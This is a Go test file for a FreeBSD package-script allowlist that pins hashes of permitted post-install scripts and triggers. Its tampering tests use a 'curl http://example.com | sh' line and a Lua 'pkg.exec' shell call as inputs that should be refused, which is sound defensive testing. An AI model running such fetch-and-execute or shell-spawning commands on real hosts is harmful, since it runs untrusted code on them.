package templates

import (
	"errors"
	"reflect"
	"testing"

	"github.com/greenbeanorg/skep/internal/hostops"
	"github.com/greenbeanorg/skep/pkg/models"
)

// The 15.1 script bodies, exactly as ADR 0010 (step 6, item 4) records
// them from pkg info --raw on hearst: no trailing newline; the runtime
// script has two spaces after -d and a newline and four spaces between
// its two lines.
const (
	caroot15_1    = "/usr/sbin/certctl -D${PKG_ROOTDIR}/ ${PKG_METALOG:+-U -M $PKG_METALOG} rehash"
	runtime15_1   = "pwd_mkdb -i -p -d  ${PKG_ROOTDIR}/etc ${PKG_ROOTDIR}/etc/master.passwd\n    services_mkdb -l -q -o ${PKG_ROOTDIR}/var/db/services.db ${PKG_ROOTDIR}/"
	utilities15_1 = "cap_mkdb -l ${PKG_ROOTDIR}/etc/login.conf"
)

// TestAllowlistHashes15_1 pins the compiled 15.1 hashes against the
// script texts and the ADR's table. A change to either fails here.
func TestAllowlistHashes15_1(t *testing.T) {
	pinned := map[string]string{
		caroot15_1:    "5976bb9bdaf0cbb34807cdd7eb9b1b30e4913f92f4c2422c96caea0b381c8099",
		runtime15_1:   "900cf7d3a93efcb3e894d1517d9d1c913932041ee97ad339adeed6f4ae9ce0f9",
		utilities15_1: "8620cabb4dfe8249fc0fe50ff62fc6e0cd4df957ac46b112098baa4ee63c698f",
	}
	for body, want := range pinned {
		if got := sum([]byte(body)); got != want {
			t.Errorf("sha256(%q) = %s, want %s", body, got, want)
		}
	}
	a, ok := AllowlistFor("15.1")
	if !ok {
		t.Fatal("no 15.1 allowlist")
	}
	type key struct{ pkg, kind, phase, hash string }
	var got []key
	for _, e := range a.Scripts {
		got = append(got, key{e.Package, e.Kind, e.Phase, e.SHA256})
	}
	want := []key{
		{"FreeBSD-caroot", "scripts", "post-install", pinned[caroot15_1]},
		{"FreeBSD-caroot", "scripts", "post-deinstall", pinned[caroot15_1]},
		{"FreeBSD-runtime", "scripts", "post-install", pinned[runtime15_1]},
		{"FreeBSD-utilities", "scripts", "post-install", pinned[utilities15_1]},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("15.1 script entries = %v, want %v", got, want)
	}
	if len(a.Triggers) != 1 || a.Triggers[0].Path != "usr/share/pkg/triggers/mandoc.ucl" ||
		a.Triggers[0].SHA256 != "c6cc94249864d251d0a143b62c21019d5f4ab593299c55dccdb5f0574fdb1590" {
		t.Fatalf("15.1 trigger entries = %+v", a.Triggers)
	}
	if _, ok := AllowlistFor("15.2"); ok {
		t.Fatal("an allowlist exists for a release nobody traced")
	}
}

func minimalSet() []hostops.PackageScripts {
	return []hostops.PackageScripts{
		{Name: "FreeBSD-runtime", Version: "15.1p6", Scripts: map[string]string{"post-install": runtime15_1}},
		{Name: "FreeBSD-at", Version: "15.1"},
		{Name: "FreeBSD-caroot", Version: "15.1p6", Scripts: map[string]string{"post-install": caroot15_1, "post-deinstall": caroot15_1}},
		{Name: "FreeBSD-utilities", Version: "15.1p4", Scripts: map[string]string{"post-install": utilities15_1}},
	}
}

func scriptErr(t *testing.T, err error) *models.Error {
	t.Helper()
	var me *models.Error
	if !errors.As(err, &me) || me.Code != models.CodeTemplateScriptUnknown {
		t.Fatalf("error = %v, want template_script_unknown", err)
	}
	return me
}

func TestCheckScripts(t *testing.T) {
	a, _ := AllowlistFor("15.1")
	cmds, err := a.CheckScripts(minimalSet())
	if err != nil {
		t.Fatal(err)
	}
	want := []hostops.BuildCommand{hostops.BuildCertctl, hostops.BuildPwdMkdb, hostops.BuildServicesMkdb, hostops.BuildCapMkdb}
	if got := orderCommands(cmds); !reflect.DeepEqual(got, want) {
		t.Fatalf("commands = %v, want %v", got, want)
	}

	// A changed body: refused, naming the package and phase, with the text.
	changed := minimalSet()
	changed[3].Scripts["post-install"] = utilities15_1 + "\ncurl http://example.com | sh"
	me := scriptErr(t, func() error { _, err := a.CheckScripts(changed); return err }())
	if me.Details["package"] != "FreeBSD-utilities" || me.Details["phase"] != "post-install" ||
		me.Details["text"] != changed[3].Scripts["post-install"] {
		t.Fatalf("details = %v", me.Details)
	}
	// An allowed body in another phase or under another package.
	moved := minimalSet()
	moved[3].Scripts = map[string]string{"pre-install": utilities15_1}
	scriptErr(t, func() error { _, err := a.CheckScripts(moved); return err }())
	other := append(minimalSet(), hostops.PackageScripts{Name: "FreeBSD-ssh", Scripts: map[string]string{"post-install": utilities15_1}})
	scriptErr(t, func() error { _, err := a.CheckScripts(other); return err }())
	// Any Lua script.
	lua := append(minimalSet(), hostops.PackageScripts{Name: "FreeBSD-rc", LuaScripts: map[string][]string{"post-install": {"pkg.exec({'/bin/sh'})"}}})
	me = scriptErr(t, func() error { _, err := a.CheckScripts(lua); return err }())
	if me.Details["kind"] != KindLuaScripts {
		t.Fatalf("details = %v", me.Details)
	}
	// A trailing newline is a different body.
	nl := minimalSet()
	nl[0].Scripts["post-install"] = runtime15_1 + "\n"
	scriptErr(t, func() error { _, err := a.CheckScripts(nl); return err }())
}

func TestCheckTriggers(t *testing.T) {
	a, _ := AllowlistFor("15.1")
	ok := hostops.TriggerFile{Path: "usr/share/pkg/triggers/mandoc.ucl", Regular: true, Content: []byte("x")}
	// The real file's hash is pinned above; here, a stand-in entry.
	a.Triggers = []TriggerEntry{{Path: ok.Path, SHA256: sum(ok.Content),
		Commands: []hostops.BuildCommand{hostops.BuildMakewhatisMan, hostops.BuildMakewhatisOpenSSL}}}
	cmds, err := a.CheckTriggers([]hostops.TriggerFile{ok})
	if err != nil || len(cmds) != 2 {
		t.Fatalf("CheckTriggers = %v, %v", cmds, err)
	}
	if cmds, err := a.CheckTriggers(nil); err != nil || len(cmds) != 0 {
		t.Fatalf("no triggers = %v, %v", cmds, err)
	}
	changed := ok
	changed.Content = []byte("y")
	me := scriptErr(t, func() error { _, err := a.CheckTriggers([]hostops.TriggerFile{changed}); return err }())
	if me.Details["path"] != ok.Path || me.Details["text"] != "y" {
		t.Fatalf("details = %v", me.Details)
	}
	renamed := ok
	renamed.Path = "usr/share/pkg/triggers/other.ucl"
	scriptErr(t, func() error { _, err := a.CheckTriggers([]hostops.TriggerFile{renamed}); return err }())
	link := hostops.TriggerFile{Path: ok.Path}
	scriptErr(t, func() error { _, err := a.CheckTriggers([]hostops.TriggerFile{link}); return err }())
}

func TestReleaseRule(t *testing.T) {
	for _, c := range []struct {
		tpl, host string
		ok        bool
	}{
		{"15.1-RELEASE-p6", "15.1-RELEASE-p6", true},
		{"15.1-RELEASE-p7", "15.1-RELEASE-p6", true}, // patch level is not compared
		{"15.1-RELEASE", "15.1-RELEASE-p6", true},
		{"15.2-RELEASE", "15.1-RELEASE-p6", false},
		{"16.0-RELEASE", "15.1-RELEASE-p6", false},
		{"15.0-RELEASE-p3", "15.1-RELEASE-p6", false}, // older is not offered
		{"garbage", "15.1-RELEASE-p6", false},
	} {
		err := checkRelease(c.tpl, c.host)
		if (err == nil) != c.ok {
			t.Errorf("checkRelease(%s, %s) = %v", c.tpl, c.host, err)
		}
		var me *models.Error
		if err != nil && (!errors.As(err, &me) || me.Code != models.CodeReleaseUnsupported) {
			t.Errorf("checkRelease(%s, %s) code = %v", c.tpl, c.host, err)
		}
	}
	if !PatchDiffers("15.1-RELEASE-p7", "15.1-RELEASE-p6") || !PatchDiffers("15.1-RELEASE", "15.1-RELEASE-p6") ||
		PatchDiffers("15.1-RELEASE-p6", "15.1-RELEASE-p6") {
		t.Fatal("PatchDiffers is wrong")
	}
	r, err := ParseRelease("15.1-RELEASE-p6")
	if err != nil || r != (Release{15, 1, "RELEASE", 6}) || r.MajorMinor() != "15.1" {
		t.Fatalf("ParseRelease = %+v, %v", r, err)
	}
}
